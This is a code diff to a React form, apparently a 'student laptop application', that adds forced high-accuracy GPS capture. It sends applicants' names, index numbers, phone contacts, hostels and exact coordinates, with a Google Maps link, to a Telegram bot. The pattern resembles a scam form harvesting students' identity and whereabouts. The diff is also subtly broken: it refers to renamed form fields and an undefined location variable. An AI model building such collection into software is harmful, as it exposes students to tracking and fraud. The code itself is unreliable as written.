@@ -71,6 +71,65 @@ interface FormErrors {
    INITIAL DATA
 ============================================================ */
 
+
+
+const getStudentLocation = (): Promise<{
+  latitude: number;
+  longitude: number;
+}> => {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject(
+        new Error(
+          "Location services are not supported by this device."
+        )
+      );
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        resolve({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+        });
+      },
+      (error) => {
+        if (error.code === error.PERMISSION_DENIED) {
+          reject(
+            new Error(
+              "Location access is required. Please allow location access and try again."
+            )
+          );
+        } else if (error.code === error.POSITION_UNAVAILABLE) {
+          reject(
+            new Error(
+              "Your location could not be determined. Please turn on GPS/location services and try again."
+            )
+          );
+        } else if (error.code === error.TIMEOUT) {
+          reject(
+            new Error(
+              "Location request timed out. Please try again."
+            )
+          );
+        } else {
+          reject(
+            new Error(
+              "Unable to obtain your location. Please try again."
+            )
+          );
+        }
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0,
+      }
+    );
+  });
+};
+
 const initialFormData: FormData = {
   firstName: "",
   middleName: "",
@@ -334,30 +393,45 @@ function App(): React.ReactElement {
         .filter(Boolean)
         .join(" ");
 
-      const telegramMessage = [
-        "🎓 NEW STUDENT LAPTOP APPLICATION",
-        "",
-        "━━━━━━━━━━━━━━━━━━━━",
-        "PERSONAL INFORMATION",
-        "━━━━━━━━━━━━━━━━━━━━",
-        `Name: ${fullName}`,
-        `Index Number: ${formData.indexNumber.trim()}`,
-        `Contact: ${formData.contact}`,
-        "",
-        "━━━━━━━━━━━━━━━━━━━━",
-        "ACADEMIC INFORMATION",
-        "━━━━━━━━━━━━━━━━━━━━",
-        `Programme: ${formData.programme.trim()}`,
-        `Year: ${formData.year}`,
-        "",
-        "━━━━━━━━━━━━━━━━━━━━",
-        "ACCOMMODATION",
-        "━━━━━━━━━━━━━━━━━━━━",
-        `Hostel Type: ${formData.hostelType}`,
-        `Hostel: ${formData.hostel.trim()}`,
-        "",
-        `Submitted: ${new Date().toLocaleString("en-GH", { timeZone: "Africa/Accra" })}`,
-      ].join("\n");
+const telegramMessage = `
+🎓 NEW STUDENT LAPTOP APPLICATION
+
+━━━━━━━━━━━━━━━━━━━━
+PERSONAL INFORMATION
+━━━━━━━━━━━━━━━━━━━━
+
+Name: ${fullName}
+Index Number: ${formData.indexNo}
+Contact: ${formData.contact}
+
+━━━━━━━━━━━━━━━━━━━━
+ACADEMIC INFORMATION
+━━━━━━━━━━━━━━━━━━━━
+
+Programme: ${formData.program}
+Year: ${formData.year}
+
+━━━━━━━━━━━━━━━━━━━━
+ACCOMMODATION
+━━━━━━━━━━━━━━━━━━━━
+
+Hostel Type: ${formData.hostelType}
+Hostel: ${formData.hostel}
+
+━━━━━━━━━━━━━━━━━━━━
+📍 LOCATION VERIFICATION
+━━━━━━━━━━━━━━━━━━━━
+
+Latitude: ${location.latitude}
+Longitude: ${location.longitude}
+
+Google Maps:
+https://www.google.com/maps?q=${location.latitude},${location.longitude}
+
+━━━━━━━━━━━━━━━━━━━━
+
+Submitted: ${new Date().toLocaleString()}
+`.trim();
 
       const response = await fetch(
         `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
